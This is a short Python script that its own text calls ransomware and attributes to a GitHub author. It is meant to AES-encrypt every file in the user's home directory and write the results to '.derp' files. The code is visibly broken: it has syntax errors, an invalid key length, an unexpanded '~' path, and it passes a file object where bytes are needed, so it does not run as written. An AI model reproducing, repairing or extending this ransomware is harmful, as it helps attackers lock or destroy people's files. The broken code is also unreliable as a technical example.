from Crypto.Cipher import AES
print("This is ransomware coded by https://github.com/BenPI88. DO NOT RUN ON NON-TEST ENVIROMENTS!!!")
input("")
import random
key = b'pengy2pengy'
cipher = AES.new(key, AES.MODE_EAX)
# import OS module
import os
# Get the list of all files and directories
path = "~"
dir_list = os.listdir(path)
i = -1
while not i = len(dir_list) - 1
	i = i + 1
	data = open(dir_list[i], w+)
	nonce = cipher.nonce
	ciphertext, tag = cipher.encrypt_and_digest(data)
	writeto = open(str(dir_list[i]) + ".derp")
	writeto.write(tag)
	data.close()
